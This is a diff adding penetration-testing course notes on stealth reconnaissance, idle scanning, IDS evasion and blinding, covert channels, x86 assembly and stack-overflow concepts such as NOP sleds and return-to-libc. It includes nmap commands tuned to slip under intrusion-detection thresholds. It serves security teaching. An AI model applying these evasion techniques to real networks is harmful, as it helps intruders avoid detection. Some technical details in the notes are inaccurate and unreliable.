@@ -1,0 +1,3110 @@
+# Introduction to Advanced Hacking
+	
+	- Learn More Advanced Attacks
+	- Learn how to find and exploit vulnerabilities in software
+	- Learn how to deal with software protection
+	- schemes when we only have a binary
+	- Attack Layer 7 applications (primarily data-driven web apps)
+	
+#Custom Apps are common
+		1. Many companies develop their own apps
+			- Never reviewed for security vulns
+			- In practice, end up being extremely vulnerable
+			- Expert pen testers can find holes in these programs
+			- Find your own Oday
+		
+		2. Even find holes in publicly distributed software
+			- Much more difficult, as there are more people looking at it
+		
+		3. Many times on a pen test you only have a binary
+			- Binary does not allow you to use it, via some sort of protection scheme or passwording
+			- Not talking about removing copyright protections
+		
+		4. Reverse Engineering is required on most Windows binaries
+			- Also if you want to audit a windows app for security holes
+		
+		5. Lots of chance to hack web apps
+			- Open to the public
+			- Not monitered via IDS
+			- Often writtern by developer with little or no security training
+		
+		6. Each web app is custom built for the company, not many general webapps you 
+		   can outright purchase.
+		
+		7. Requires attention to detail
+		
+		8. requires patience
+		
+		9. requires understanding of memory architecture
+		
+		
+	Methodology (Proccess) :
+		
+		1. Discover Vulnerability
+			- Manual Fault Injection
+			- Fuzzing
+			- Reverse Engineering
+			- Debugging
+		
+		2. Write Proof of Concept
+			- Stack Overflow
+			- Heap Overflow
+			- Kernel Overflow
+			- Sign Overflow
+			- Format String Attack
+			- Web Attack
+			
+		3. Select Payload
+			- Encoders
+			- Packers/Cryptors
+			
+# Advanced Recon
+	
+	- Stealth Strategies
+	- Evading IDS/IPS
+	- Passive Network Recon
+	- Idle Scanning
+	- Automated Metadata Gathering
+	
+	Moder Network Recon
+		
+		- 2 Major problems when doing recon in today IT environment
+			- Lots of security infrastructure to contend with
+			- to much data
+		
+		- Stealth is a priority
+			-Stealth is a priority
+			- Almost everyone knows about portscanning tools
+			- Advanced recon will attempt to identify
+			  systems without setting off alarms
+			  
+		- When attacking a large target, manual investigation is not 
+		  feasible, need to automate certain tasks
+		  
+	Why stealth?
+		- Stealth is extremely important when doing network recon
+			- We are trying to emulate malicious hackers! And they don't want to be detected
+			- Don't want an active response from people OR security devices
+			
+		- Stealth may not be a priority when attacking from internet
+			- Millions of portscans per hour against big companies
+			- 15/hour against a home IP address
+		
+		- Once you break in, stealth is a major priority
+			- A web server scanning the database server in the DMZ is very fishy.
+	
+	Overall Strategies
+		
+		- There are some general strategies for stealth
+		- Never use default settings (or default anything)
+		- Behavior detection can be circumvented by scanning below 
+		  the target threshold
+			- Look at default settings on an IDS, like
+			- Snort, and see what the portscan detector shows 
+			- Such as: 5 ports in under 1 second = Alert
+		
+		- Get ahead in the rat race
+			- People are always inventing new tools/ features to get around detection
+			- Idlescanning, moon bouncing, bi-directional spoofing
+		
+		- Passive traffic observation
+			- Network traffic contains lots of information
+			- Every vendor implements the RFCs slightly different
+				- Results: Different systems generate different traffic
+			- We can get loads of good information
+				- Via TCP Timestamping, we can determine the remote system's uptime
+				- By looking for quirks in the RFC implementations, we can find OS type
+				  and version
+				- Determine remote network topology
+				- Identify through NAT, where NMAP can't
+				
+		- Passive traffic observation Advantages
+			
+			- No longer need to generate noisy nmap traffic
+				- As long as traffic is generated between you and the target system,
+				  passive traffic observation can occur 
+				
+				- Can identify systems as they connect to YOU
+					- Perhaps even trick systems into connecting to you...
+					
+	TCP timestamp Gathering
+		
+		- The TCP Timestamp is equal to the system uptime.
+			- Caveat: Some OSes now multiply timestamp value by 10x (OpenBSD)
+			- If you find wacky timestamp values, they are pretty easy to pick out
+		- System Uptime can be used to identify patching levels
+	
+	OS Identification	
+		- RFC implementation variations allow for us to identify OSes passively
+			- Fragmentation
+			- TOS
+			- MTU
+			- Etc.
+		- OS ident obviously used to target exploits.
+	
+	Network Topology
+		- Different network links have a different Maximum Transmission Unit (MTU)
+			- If the network admin has played with the MT Us, you can identify 
+			  the remote link.
+			- DSL, Modem, SLIP, etc.
+		- Used for network infrastructure attacks
+	
+	NAT Identification
+		- If the same IP is giving strange OS ident info
+			- different OS genres
+			- different OS versions
+			- link type difference
+			- distance differences
+			- NAT flags differ (same OS match)
+			- timestamp delta too high
+			- timestamp delta negative
+			- timestamp delta within the norm
+			- distant occurrences
+			- etc.
+		- We can surmise NAT is happening
+	
+	Passive Observation in Practice
+		- How do we do this?
+			- pOf tool is one of the best
+			- 3 methods of attack
+			
+		- serve traffic as if floats around the network
+		- Simply connect to other systems
+			- Browse web, connect to FTP servers, etc.
+			- No need to portscan or be noisy, normal connections 
+			  will do 
+			- Force other systems to connect to you(FTP, HTML email, email bounce, identd, DCC, etc.)
+		
+		- Wait for things to connect to you
+			- Run a webserver, etc.
+			
+	SYN+ACK vs RST Modes
+		- When connecting to remote systems, you can operate in SYN+ACK or RST mode
+			- Don't need to even have an open port on the target system!
+		- SYN+ACK is used when you are communicating with an open port
+		- RST mode is used for closed ports
+		
+	ACK Scanning
+		- ACK Scanning is used to circumvent packet filtering firewalls, 
+		  routers and proxy servers 
+			- If the device doesn't have a state table to let it know which SYNs 
+			  have been sent out, it has to accept all ACK packets
+			- Will not circumvent a stateful firewall
+		
+		- Good for network discovery for devices behind packet filters
+			- Use a TCP source port 80 and ACK on ports 3100-3150, 10001-10050, 33500-33550 and
+			  50 random ports above 35000 for all hosts in the network
+			- nmap command:
+			  nmap —sA —v —v —p 3100-3150, 10001-10050, 33500-33550,35835-35900, 37929-37950 192.168.1.1/24
+	
+	Idle Scanning
+		- Idlescan, as it has become known, allows for completely stealthy port scanning.
+		
+		- Attackers can actually scan a target without sending a single packet to the
+		  target from their own IP address!
+		
+		- Instead, a clever side-channel attack allows for the scan to be bounced off a
+		  quiet host. Intrusion detection system (IDS) reports will finger the innocent
+		  quiet host as the attacker.
+		
+		- Two important behaviors to understand:
+			- One way to determine whether a port is open is to send a "SYN" (session establishment) packet to the port. 
+			  The target machine will send back a SYN-ACK (session request acknowledgment) packet if the port is open, 
+			  and a RST	packet if the port is closed.
+			
+			- A machine which receives an unsolicited SYN-ACK packet will respond with a RST. An unsolicited RST will be ignored.
+			
+			- Every IP packet on the Internet has a "fragment identification" (IPID) number. Many operating systems simply 
+			  increment this number for every packet they send. So probing for this number can tell an attacker how many
+			  packets have been sent since the last probe.
+		
+	- Step 1 : Choose a quiet host and probe for current IPID number
+						
+					|		IPID Probe            |
+					|	---------------------->	  |
+					|	  SYN/ACK Packet		  |
+		Attacker	|							  |    Zombie
+					|	 Response; IPID=31337	  |
+					|	<---------------------	  |
+					|			RST				  |
+					
+					
+	- Step 2 : Send spoofed probes with IP address of quiet host
+		
+			    	Probe to Open port 80
+				
+				|  session Request from 'Z'  |
+		Attacker|	-----------------------> |	
+		--------|  SYN to port 80; Src IP:Z  |
+											 |
+				   Session Acknowledgement   |  Target
+		--------|	<-----------------       | 
+		Zombie	|		SYN/ACK				 |
+				|                            |
+                |   Bogus session;IPID=31338 |
+		--------|	---------------------->  | 
+						RST			
+						
+						OR
+		
+					Probe to Close port 42
+		
+				|  session Request from 'Z'      |
+		Attacker|	-------------------------->  |	
+		--------|  SYN to port 42; Src IP:Z      |
+											     |
+		--------|  Bogus session! Port is closed |  Target
+		Zombie  |	<--------------------------  | 
+				|			RST                  |
+				
+		- An open port will increment IPID on quiet host, while a closed port won't
+		
+		
+	- Step 3 : Send probes to quiet host and find out IPID, if it was incremented by 2, 
+			   we can infer that the port is open!
+			   
+					|		IPID Probe            |
+					|	---------------------->	  |
+					|	  SYN/ACK Packet		  |
+		Attacker	|							  |    Zombie
+					|	 Response; IPID=31339	  |
+					|	<---------------------	  |
+					|			RST				  |
+					
+					
+							OR
+							
+					|		IPID Probe            |
+					|	---------------------->	  |
+					|	  SYN/ACK Packet		  |
+		Attacker	|							  |    Zombie
+					|	 Response; IPID=31338	  |
+					|	<---------------------	  |
+					|			RST				  |
+		
+		- If only incremented by 1, the port was closed.
+		
+	
+	Evading IDA/IPS recon detection
+		- Many behavioral IDS/IPS consider a certain number of port service requests
+		  in a defined number of seconds an attack 
+			- May alert IDS admin
+			- IPS may block your IP address for a hour/ day/ forever
+		
+		- Easy to overcome
+			- Slow scan to below the threshold
+			- nmap command for one port request every 1.5 minutes:
+				nmap —sT —v —v —PO —-max parallelism 1 --scan_delay 90000 192.168.1.1
+				
+	
+# Blinding IDS
+		
+		- Intrusion Detection Overview
+		- Intrusion Prevention
+		- Blinding IDSs
+		- Hiding from IDSs
+	
+	1. Intrusion Detection Overview
+		
+		- Intrusion Dectection is the science of detecting patterns of system or network usage that are
+		  created only when a system is compromised (or about to be compromised)
+			- Manual Intrusion Detection was done in the late 80's using TCPdump
+			- Security admins looked through traffic logs for suspicious signs
+		
+		- Looking through traffic logs became impractical
+			- Too much traffic
+			- Too many attacks
+			- Attacks look much like normal traffic
+			- Normal traffic looks much like attacks
+		
+		- Intrusion Detection Systems were born
+			- An IDS is a sniffer plus special filters
+			
+		- Network IDSs
+			- Every time a packet (or group of packets) matches a filter (termed rule) an alert goes off
+			
+		- A big problem with IDSs is that they often confuse benign traffic with an attack
+			- This is known as a false positive
+		
+		- A bigger problem with IDSs is attacks can flow by without setting off an alert
+			- Known as a false negative
+		
+		- Snort is the Open Source IDS
+			- Powerful rule writing syntax
+			- Open source
+			- Very fast
+	
+	2. Intrusion Prevention
+		
+		- Network Intrusion Prevention
+			- The latest security technology is "Intrusion Prevention"
+			- Network IPS is simply IDS technology with the ability to 
+			  close connections or block IP addresses
+		
+		- Almost every IDS has a "prevention component"
+			- Cisco can dynamically create ACLs across the entire network when 
+			  it detects an attack
+			
+			- Snort can send TCP RSTs to stop connections with flexresp or 
+			  block IPs with SnortSam
+			
+			- ISS, Netscreen, Top Layer all implement the same concept
+	
+		- Is Intrusion Prevention a good idea?
+			- Uses same IDS technology, sniffer plus filters
+			- Only adds on a automatic response
+			
+		- Vendors think So...
+		
+		- What about false positive and negatives?
+			- Network Intrusion Prevention false positive
+				- When a false positive hits an IPS, the IPS blocks the IP address or shuts down the TCP stream
+				- What if an attacker creates millions of false positives from spoofed IP address?
+				- What if spoofed addresses are from vendors, business parterns, and infrastructure providers?
+				
+		
+	3. Blinding IDSs
+		- There are several tools out to create a strom of false positive against and IDS
+			- Snot was the first, it simply created a bunch of TCP SYNs, but never completed handshake
+			- Was easy to detect, if the connection was never finished, no worry
+	
+		- Sneeze is more sophisticated
+			- It takes as input all of the snort rules, and blasts them out to the IDS
+			- Can create hundreds of thousands of alerts per minute
+			- spoofed source IPs
+		
+		- Sneeze attacks are useful for an Ethical Hacker
+			- can DoS the IDS management console
+			- Overwhelm the IDS admin
+			- Hide real attacks
+			- If intrusion prevention is enabled, can severely impact availability of attacked system 
+		
+		- Sneeze attacks are very effective, but disruptive and noisy
+			- If we want to avoid IDSs, we have to be a little stealthy
+		
+		- Covert Channels
+			- Using another type of cover channel (ack tunnel) should be picked up by any IDS admin
+			- ICMP tunnels are good option, as long as YOU stay below the "large ICMP packet"
+			  alert threshold
+			- The best are encrypted covert channels
+		
+		- Even when using an encrypted channel, you must be smart
+			- If you choose strange ports you may get noticed
+			- Port 80 to Port 80 through the firewall looks odd, if company isn't using web services
+			- Choose instead, port 1387 to 443 through the firewall
+		
+		- If you can, use an existing service, such as SSH
+			- Be aware, some IDSs can have a cert installed	on the IDS to decrypt traffic in transit
+			- Consider enabling/ installing SSH on a box that doesn't have it (but might)
+			- Cryptcat is great too, as it is easy to run it on	any port (and forward to any port)
+			
+
+# Finding Vulnerability in Software
+	1. Vulnerability Mapping	
+		- Using Nessus
+		- Manual Vulnerability Discovery
+		- Mapping Client Side Vulnerability
+		
+	2. Nessus
+		- Probably the most widely known scanner
+		- very powerful plugins
+		- free for non-commercial use
+		- Very up to date
+		- Easy to use
+		- Several options as far as a client goes
+		
+	Mapping Vulns with Nessus
+		- A Nessus scan shows you potential vulnerabilities.
+		- The identified vulnerabilities are usually coupled with an explanation as well as 
+		  links to vendor or open source disclosure concerning the vulnerability.
+		- Steps to take:
+			- Read up on the vulnerability
+			- Look for PoC (proof of concept) exploits and code
+			- Test code against a vulnerable target (ideally In a lab environment)
+			- Verify any service disruption or potential collateral damage.
+			- Document findings
+			- Proceed with exploitation
+	
+	Shortcomings of Nessus
+		- Depends 100% on plugins being up to date
+		- Not good at detecting vulnerabilities presented by third party or
+		  fringe applications
+		- Have to contend with and wade through a considerable amount of
+		  false positives
+		- Correlation can be extremely time consuming
+		- No intelligence (I.e. Does port 21 open mean there has to be an FTP server there?)
+		- Cannot Identify un-published vulnerabilities.
+	
+	Manual Vulnerability Mapping
+		- Why manual, when we have so many pretty chart generating automated tools?
+			- Identify un-published vulnerabilities
+			- Identify uncommon configuration vulnerabilities
+			- Check version Information for 3rd party software
+			- Minimize your footprint and noise
+			- Because this is an advanced class!
+			
+		Let's look at a basic example;
+		- First let's examine recon information from one of our previous scans
+			
+			># nmap -sT -sV 192.168.1.152 -p 80
+			
+		we see that our nmap scan has revealed that IIS/6.0 is running on the target 2003 server.
+		Next let's do a little bit of manual vulnerability searching now.
+		
+		
+		Going to google and doing the following query;
+			
+			> intext: IIS/6.0 vulnerabilities renders currently about 50,000 results.
+		
+		One of those results is the IIS Remote Buffer
+		Overflow vulnerability. So take that vulnerability then change your query based on that.
+			
+			> intext:iis 6.0 Remote Buffer Overflow exploit code
+			
+		Client side vulnerabilities are not always as easy to identify. Some common client side attack agents include;
+			
+			- Adobe Reader
+			- Winzip
+			- Itunes
+			- Internet Explorer
+			- Firefox
+			- Safari
+			- Adobe Flash Player
+	
+	Identifying Client Side vulns
+		An nmap scan of a target machine might not Identify the fact that adobe reader Is running
+		on the target machine. But what about a Snmp MIB browser scan with Solar Winds?
+		Steps typically go as follows;
+			1. Analyze/ revisit recon data.
+			2. Identify any client software which might be running on the target.
+			3. Find vulnerabilities related to that client software.
+			4. Identify a nd test exploits for Identified vulnerabilities.
+			5. Attack.
+			
+		Consider the MIB Browser scan below from SolarWinds. We can clearly see several
+		client a pplicatlons that might be vulnerable
+		
+	
+# x86 Assembly For Exploit Development
+	Module Overview
+		- Computing Fundamentals
+		- CPU Registers
+		- Memory segements
+		- Assembly Instructions
+		
+	
+	Computer Architecture
+		- Exploit development requires a strong understanding of RAM and CPU registers
+		
+							 Secondary Storage
+							 ^  			|
+							 |				|
+							 |				∨
+							--------------------	
+	  Input    ----------->|	Memory (RAM)    | ----------->   Output
+	 Devices	           |                    |				Devices
+						    --------------------
+							 ^				|
+							 |				|
+							 |				∨
+							  CPU(Registers)
+							  
+	
+	Digit Representation
+		- Decimal: Ten possible values per digit (0-9)
+		- Binary: Two possible values per digit (0 or 1)
+		- Hexadecimal: Sixteen possible values per digit (0-9 and A-F)
+			
+			
+				Binary	|  Hex	|	Decimal
+						|		|		
+				0000	|	0	|	   0
+				0001	|	1	|	   1
+				0010	|	2	|	   2
+				0011	|	3	|	   3
+				0100	|	4	|	   4
+				0101	|	5	|	   5
+				0110	|	6	|	   6
+				0111	|	7	|	   7
+				1000	|	8	|	   8
+				1001	|	9	|	   9
+				1010	|	A	|	  10
+				1011	|	B	|	  11
+				1100	|	C	|	  12
+				1101	|	D	|	  13
+				1110	|	E	|	  14
+				1111	|	F	|	  15
+				
+				
+	Terminology
+		- Bit = 1 binary value (0 or 1)
+		- Nibble = 4 bits
+		- Byte = 8 bits
+		- Word = 16 bits/ 2 bytes
+		- Double Word (dword) = 32 bits/ 4 bytes
+		- Quad Word (qword)	= 64 bits/ 8 bytes
+			
+				A4	8C	40 01
+				
+				1. A4  ---> Bytes
+				2. A4 8c  ---> Word
+				3. A4 8c 40 ---> Dword
+				4. A4 8C 40 01 ---> Qword
+				
+	Numbers
+		- Numbers can be signed or unsigned
+		With signed numbers and operations, the most significant bit Indicates If 
+		the value Is positive or negative
+		
+		Examples
+			
+			Hex		Binary			If unsigned		If signed
+			0x7F	0111 1111		127				127
+			0x80	1000 0000		128			    -128
+			0xFF	1111 1111		255				-1
+			
+	Characters
+		- Characters are represented numerically using standards like
+		ASCII
+			Example : 	A =	0x41
+			
+			
+	Endian 
+		
+		- When a dword is stored in memory, it is stored as a sequence of bytes
+		Two ways to store:
+			Little endian format: least significant byte first
+			Big endian format: most significant byte first
+		
+		For a value of 0x11223344:
+			Little endian: 44 33 22 11
+			Big endian:	11 22 33 44
+		
+		Intel architecture uses little endian
+	
+	Programming
+		Interpreted Languages
+			Scripts that are interpreted line by line at runtime
+		
+		High level languages
+			Code -> Compile -> Link ->Executable binary
+			
+		Low level languages
+			Machine code pneumonics -> assemble -> machine code
+																					- Each byte of RAM has an address
+																					- CPU registers interact with contents in RAM																					
+																			
+																						  Memory (RAM)
+																					  ------------------------
+																					 |						  |
+		High-Level	----> Compiler	-->	Object Code	--> Linker	--> Executable	-------> Machine Instructions ------> 	CPU Registers
+														  ^							 |					  ^	  |				|
+														  |							 |    	  Data	  	  |	  |				|
+										Libraries	------							 |	       | | <-------------------------
+																		user   		  ---------|-------------- 
+																	   computer ----------------			 
+																	   
+																	   
+																	   
+																	   
+	Registers
+		- Extremely efficient and fast memory containers
+		- Allow for direct communication between memory and the CPU
+		
+		- Four general types of registers:
+			- General
+			- Segement
+			- Offset
+			- Special
+					
+	
+	Common Registers
+		
+		Register		Description								Type
+		EAX				Extended Accumulator Register			General
+		EBX				Extended Base Register					General
+		ECX				Extended Counter Register				General
+		EDX				Extended Data Register					General
+		EBP				Extended Base Pointer					Offset
+		ESP				Extended Stack Pointer					Offset
+		ESI				Extended Source Index					Offset
+		EDI				Extended Destination Index				Offset
+		EIP				Extended Instruction Pointer			Offset
+		CS				Code Segment							Segment
+		DS				Data Segment							Segment
+		SS 				Stack Segment							Segment
+		ES				Extra Segment							Segment
+		FS				General Purpose Extra Segment			Segment
+		GS				General	Pupose	Extra Segment			Segment
+		
+	
+	General Registers
+		- General registers are used for data manipulation purpose x86 processors 
+		  have 4 32-bit general purpose registers :
+				
+				EAX, EBX, ECX, EDX
+				
+		- These can be split into 16-bit subregisters:
+				
+				AX, BX, CX, DX
+		
+		- Or as 8-bit subregisters:
+				
+				AL, AH, BL, BH, CL, CH, DL, DH
+				
+		H --> HIgh order ,     L --> Low Order
+		
+		1. 	EAX								AX
+									   <------------>
+									   AH			AL	
+						 ______ ______ ______ ______
+						|______|______|______|______|
+					   32	 24 23  16 15   8 7 	0
+					   
+		
+						   
+		2. 	EBX								BX
+									   <------------>
+									   BH			BL	
+						 ______ ______ ______ ______
+						|______|______|______|______|
+					   32	 24 23  16 15   8 7 	0
+					   
+		
+		3.  ECX								CX
+									   <------------>
+									   CH			CL	
+					     ______ ______ ______ ______
+						|______|______|______|______|
+					   32	 24 23  16 15   8 7 	0
+						   
+		4. 	EDX								DX
+									   <------------>
+									   DH			DL	
+						 ______ ______ ______ ______
+						|______|______|______|______|
+					   32	 24 23  16 15   8 7 	0
+					   
+					   
+	Segment Registers
+		- Segment registers are used to maintain ease of memory addressing
+				
+				cs, ds, es, ss, fs, gs
+		
+		- Segment registers contain the base address of a segment Base address is combined with an offset
+		  to form a linear address
+		  
+	
+	Offset Registers
+		
+		- Offset (or address) registers are used to determine the location of address relative to 
+		  a segment register or other fixed place in memory.
+		
+		- There are 4 32-bit offset (or address) registers:
+				
+				ESI, EDI, EBP, ESP
+		
+		- These can be accessed via 16-bit versions:
+				
+				SI, DI, BP, SP
+				
+	
+# Memory and Stack Overflows pt. 1
+	
+	Segment		Description
+	.text		- Holds programs instructions
+				- Read only (because it is shared between every process that uses the binary)
+				- When you get a segmentation fault, you are writing to .text
+				
+	.data		- Stores initialized global static data
+				- I.e., values Known when the binary is compiled
+				
+	.bss		- Stores uninitialized global data
+	
+	Stack		- Stores local variables
+				- LIFO
+				
+	Heap		- Dynamic variables
+				- Memory areas addressed by pointers
+				- Pointers do not point to a valid address when declared in the stack or .bss
+				- When a process allocates memory (using malloc), the address of the 
+				  first byte of that memory is placed in the pointer
+		
+-----------------------------------------------------------------------------------------------------		
+	Sample C++ Program
+		
+	int one = 1;			// stored in .data
+	char * str;				//stored in .bss
+	int empty;				//stored in .bss
+	
+	void f(char c){
+		int i;			//stored on the stack
+		
+		str	= (char*) malloc (10 * sizeof(char));		// heap 
+		strncpy(str, "qwetryuiop", 10);
+	}
+	
+	int main(void){
+		f(0);
+	}
+	
+	
+	- Compiler
+	> gcc file.c -ggdb3 -o file
+	
+	- Disassemble
+	> gdb file 
+	
+		Example:
+				>(gdb) list
+				>(gdb) break 9
+				>(gdb) run
+				>(gdb) print &one
+				>(gdb) info symbol <value from last step>
+				>(gdb) print &empty
+				>(gdb) info symbol <value from last step>
+				>(gdb) print str
+-----------------------------------------------------------------------------------------------------
+
+	Memory Layout
+			
+		|				|   0xBFFFFFFF
+		|_______________|	
+		|	Arguments	|   High Addresses
+		| Env. Variables|
+		|_______________|
+		|	Stack		|   ^	
+		|	  |			|	|
+		|	  |			|	|	user
+		|	  v			|	|	stack
+		|				|	|	frame
+		|	  ^			|	|
+		|	  |      	|	|
+		|	  |			|	v
+		|	 Heap 		|
+		|_______________|
+		|	 BSS		|
+		|_______________|
+		|	  Data		|
+		|_______________|
+		|	  Code		|   Low Addresses
+		|_______________|
+		| Shared libs	|	0x80000000
+		|				|
+		
+	
+	The stack
+		- All values stored on the stack must be of dword size
+		- Two special instructions:
+			- Push
+				• Places a value on the top of the stack
+				• Reduces ESP by a word (4 bytes) to fit new value
+			- pop
+				• Takes the value pointed to by ESP and places it in a specified location (e.g., pop EAX)
+				• Increases ESP register
+				• Does not actually remove data; simply increases ESP by 4 bytes
+	
+	Functions and the Stack
+		- The function call
+			- Function's parameters are placed on the stack
+			- Current value in EIP(The instruction pointer) is saved
+			- Allows execution to continue at point where function was called
+			
+		- The function return
+			- Puts everything back in place
+			- Allows other areas of the program to use a "clean" version of the stack
+-------------------------------------------------------			
+	A sample function
+	void func(int i, int j){
+			 char str[5] = "abcde";
+			 int k = 3;
+			 j = 0;
+			 return;
+	}
+	
+	int main(int argc, char**argv){
+			int i=1;
+			func(1,2);
+			i=0;
+			printf("i=%d\n",i);
+			
+----------------------------------------------------------
+	Sample Prolog
+	- push %ebp
+	- Need to save the current state of the stack by pushing the address stored in EBP
+	- The push instruction decreases ESP by a word
+				
+														Register
+														
+													EBP				ESP
+				STACK								X				Y 
+			|			|											 -word
+			|___________|
+		  X	|___________|  <--%ebp
+			|			|
+			|			|
+			|			|									PROLOGUE : --> push %ebp
+			|___________|
+		 Y	|____X______|  <--%esp
+			|			|
+			|			|
+			|			|
+-------------------------------------------------------------
+
+	Sample Prolog
+	- mov %ebp
+	- Moving EBP to the top of the stack creates a new environment for 
+	  the function to work In
+														Register
+														
+													EBP				ESP
+				STACK								X				Y 
+			|			|							  -word			 -word
+			|___________|
+		  X	|___________|  
+			|			|
+			|			|
+			|			| --%ebp 				PROLOGUE :  push %ebp
+			|___________|/  							  --> mov	%esp, %ebp
+		 Y	|____X______|<----%esp
+			|			|
+			|			|
+			|			|
+			
+---------------------------------------------------------------
+	
+	
+	Sample Prolog
+	- sub $0xc, %esp
+	- Reserve 8 bytes on the stack (2 words) for local variables. 2 for the string "abcde", and 1 for
+	  the variable i.
+														Register
+														
+													EBP				ESP
+				STACK								X				Y 
+			|			|							  -word			 -3 word
+			|___________|
+		  X	|___________|  
+			|			|
+			|			|
+			|			| 						PROLOGUE :  push %ebp
+			|___________| 							    --> mov	%esp, %ebp
+		 Y	|____X______|<----%ebp 						--> sub1 $0xc, %esp
+			|		   e|
+			|	 d c b a|
+			|___________|
+			|	 3		|
+			|___________|
+			|			|
+			|			|
+			
+-----------------------------------------------------------------
+
+	Function Call
+	- First, function arguments are stored on the
+		stack
+	- pushed on backwards
+	
+															Register
+														
+													EBP				ESP
+				STACK								X				Y 
+			|			|							  -word			 -2 word
+			|___________|
+		  X	|___________|  <----%ebp 				EIP
+			|			|						 	z
+			|			|
+			|			| 						PROLOGUE :  push $0x2
+			|___________| 							     -->push $0x1
+		 Y	|___________|      					
+			|___________|
+			|____2______|
+			|____i______|  <-----%esp			
+			|			|
+			|			|
+
+------------------------------------------------------------------
+
+# Memory and Stack Overflows pt. 2
+	
+	Function Call
+	The call Instruction pushes the value stored In EIP on the stack
+		Later, this value will be read to transfer order of execution after 
+		the function Is complete
+	
+	Copies the address of the first prolog Instruction Into EIP, transferring control to
+	the function
+
+															Register
+														
+													EBP				ESP
+				STACK								X				Y 
+			|			|							  -word			 -2 word
+			|___________|
+		  X	|___________|  <----%ebp 				EIP
+			|			|							push %ebp
+			|			|
+			|			| 								
+			|___________|
+		 Y	|___________|							push $0x2
+			|_____2_____|							push $0x1
+			|	 		|						--> call <toto>
+			|____i______|
+			|	z+5		|  <---%esp
+			|___________|
+			|			|
+			|			|
+--------------------------------------------------------------------------------------------------------			
+	
+	Function Return
+		Uses the leave and ret Instructions to put stack
+		back In order
+			Allows for execution to resume at the original 
+			address prior to entering the function
+		Leave does a mov EBP, ESP and then a pop EBP.
+
+														Register
+														
+													EBP				ESP
+		Haut	STACK								X				Y 
+			|			|							  -word			 -3 word
+			|___________|
+		  X	|___________|  	<----%ebp 				EIP
+			|			|							ret
+			|			|
+			|			|
+			|___________|					
+			|____0______|							--> leave
+			|____i______| 						
+			|____z+5____| <----%esp 								    
+		 Y	|____X______|					
+			|		   e|
+			|	 d c b a|
+			|___________|
+			|	 3		|
+		Bas	|___________|
+
+			
+-----------------------------------------------------------------
+	Ret restores the saved EIP value back Into EIP
+	Finally we need to do an add Ox8, ESP to clear off old local variables left on the stack
+	
+															Register
+														
+													EBP				ESP
+		Haut	STACK								X				Y 
+			|			|							  -word			 -2 word
+			|___________|
+		  X	|___________|  	<----%ebp 				EIP
+			|			|							z+5
+			|			|
+			|			|
+			|___________|					
+			|____0______|							--> leave
+			|____i______| <----%esp 				--> ret	
+			|____z+5____| 								    
+		 Y	|____X______|					
+			|		   e|
+			|	 d c b a|
+			|___________|
+			|	 3		|
+		Bas	|___________|
+------------------------------------------------------------------
+	
+	Stack Overflows
+		
+		- The most common class of overflow
+			- Behind a lot of the high-profile worms, Morris Worm,
+			  Slammer, Code Red, Blaster, etc.
+			
+			- Very reliable means of exploitation Still prevalent In software.
+	
+		- The paper that Introduced stack overflows to the world:
+			- Alephl's Smashing the Stack for Fun and Profit, Phrack 49 -1996
+			
+	
+	Normal Stack Utilization
+		
+		1. Application pushes space for data backwards onto the stack.
+		2. Data is used by application
+		3. Control is handed back to the application
+		
+			
+		|________________|
+		|Local variable 3|------------------>-------->	Processor
+		|________________|								|		^	
+		|Local variable 2|------------------>------------		|
+		|________________|										|			
+		|				 |										|
+		|Storage for 	 |------------------>-------------------
+		|inputted Data	 |
+		|________________|
+		| Return Pointer |---------------------------------> Application
+		|________________|
+		|				 |
+		|				 |
+		
+	Replicating an Overflow
+		- Creating a program with a buffer overflow is easy
+		- Write a program with a function
+		- Function must declare a local variable that is a buffer(array)
+		- Program must allow too much data to be copied into the buffer
+		
+		
+	Exploiting the Stack Overflow
+	
+		- After an overflow is discovered :
+			- insted of overwasting with "A"s, overwrite return address with the address of an area of memory you control
+			- Area we control is loaded with shellcode
+			- Shellcode is executed by processor, thinking it is actually the program
+			- Program is exited cleanly
+			
+		- Shellcode is :
+			- Opcode that performs a single, simple function (spwan a root shell)
+		
+		
+		
+				|         					         |
+			 --	--------------------------------------
+			|	| local variable buffer              |
+			|	|------------------------------------|
+			|	| local variable c                   |
+			|	|------------------------------------|
+	process-|	| reference parameter b              |-------
+			|	|------------------------------------|		 |
+			|	| parameter a                        |		 |
+			|	|------------------------------------|		 |
+			|	| return address (in main)           |		 |
+			 --	|------------------------------------|		 |
+			 --	|------------------------------------|		 |
+			|	| variable y                         |<------
+	main   -|	|------------------------------------|
+			|	| variable x                         |
+			 --	--------------------------------------
+				|              	                     |
+			
+
+
+	After attack		
+				|         				             |
+			 --	--------------------------------------
+			|	| hacker data (NO-OP)                |
+			|	|------------------------------------|
+			|	| ...overflows (NO-OP)               |<--
+			|	|------------------------------------|	|
+	process-|	| code to set up backdoor            |	|
+			|	|------------------------------------|	|
+			|	| etc.                               |	|
+			|	|------------------------------------|  |
+			|	| new "return" address               |--
+			 --	--------------------------------------
+			|	| variable y                         |
+	  main -|	|------------------------------------|
+			|	| variable x                         |
+			 --	--------------------------------------
+				|              		                 |
+-------------------------------------------------------------------				
+	
+	Overwriting the Return Address
+		
+		- It is difficult to predict the exact location of the return address
+			- After shellcode is written into the buffer, start writing the return address multiple
+			  times with hopes of it overwriting the old return address
+			- Sometimes only half the address is overwritten
+			
+			Return -1 word = AABBCCDD
+				Return Address = AABBCCDD
+				Return +1 word = AABBCCDD
+			
+			Return -1 word = CCDDAABB
+				Return Address = CCDDAABB
+				Return +1 word = CCDDAABB
+				
+	
+	NOP Sledding
+		
+		- Return address should point to the first instruction in our shellcode
+		- It can be difficult to determine exactly where this is in memory
+			Off by one byte, and we get a segfault or erract
+		- To Increase chances of success, fill the buffer with a bunch of no
+			operation Instructions
+					No-Ops, NOPs, or 0x90
+		If the return address lands In this "nop pad" or "nop sled" the processor
+		will nop Its way to the Shellcode
+					NOP sledding increases the size of shellcode
+	
+	Non-Executable Stacks
+		- Very few programs ever need to execute code on the stack 
+		- Many stacks today are non-executable, (Solaris, BSD, etc.)
+			Do not allow code to be run on them, simply used as
+			storage containers
+		- These non-exec stacks are still exploitable
+		- Instead of executing shellcode that spawns a root shell,
+			use system functions and libraries that are already present
+		- This technique Is known as return-to-libc	
+	
+	Return to Iibc
+		- Return to the standard C Library
+			- Contains basic functions like exit() and system()
+			- Library is shared between most prograrns
+		- The function callingthe Ilbc function are expected to be on the stack
+		- Simply a matter of puttinga pointer to "/bin/sh" on the stack, or any other
+			- arguments you need to pass.
+		- Multlple function calls can be chained together.
+		
+	Off BY One Overflows
+		- Some functions, like strncat always place a null byte at the end of a string
